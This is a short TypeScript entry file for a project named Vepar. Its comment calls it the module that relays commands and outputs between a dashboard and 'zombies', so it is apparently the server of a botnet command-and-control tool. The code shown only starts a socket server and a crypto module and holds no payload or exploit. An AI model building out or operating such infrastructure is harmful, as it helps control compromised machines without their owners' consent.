import SocketServer from "./core/SocketServer";
import 'dotenv/config'
import CryptoModule from "./crypto/CryptoModule";


/**
 * @module VeparServer - 'The middle module'
 * @description This module of Vepar is used to receive commands and manage outputs
 *              between Dashboard and Zombies
 * @copyright UsboKirishima <usbertibox@gmail.com>
 * 
 */

const PORT = process.env.PORT ? Number(process.env.PORT) : 3000;
export const cryptoModule = new CryptoModule();
export const VeparServer = new SocketServer(PORT);